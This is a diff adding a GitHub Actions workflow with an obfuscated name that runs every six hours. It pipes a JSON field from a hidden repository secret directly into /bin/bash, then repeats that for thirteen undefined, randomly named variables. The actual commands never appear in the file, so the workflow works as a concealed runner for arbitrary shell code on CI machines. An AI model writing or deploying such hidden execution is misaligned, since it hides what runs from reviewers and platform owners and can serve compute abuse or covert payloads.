@@ -1,0 +1,30 @@
+name: nianlianghaimen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nianlianghaimen
+        env:
+          qrbtq71915: ${{ secrets.qrbtq71915 }}
+        run: |
+          echo $qrbtq71915 | jq -r .w8346 | /bin/bash
+          echo $imfef750 | jq -r .nkq2142 | /bin/bash
+          echo $zmi670 | jq -r .nk7 | /bin/bash
+          echo $o69597 | jq -r .o11831 | /bin/bash
+          echo $r6 | jq -r .mmrzo8866 | /bin/bash
+          echo $cj0 | jq -r .adec05 | /bin/bash
+          echo $l5 | jq -r .iicc5715 | /bin/bash
+          echo $oihyr7215 | jq -r .j4 | /bin/bash
+          echo $tbl337 | jq -r .kstqt264 | /bin/bash
+          echo $cnhqt842 | jq -r .oas56742 | /bin/bash
+          echo $uprsu852 | jq -r .wptrp26774 | /bin/bash
+          echo $qv6092 | jq -r .jr33390 | /bin/bash
+          echo $t9 | jq -r .kcuy656 | /bin/bash
+          echo $i865 | jq -r .c23625 | /bin/bash
+
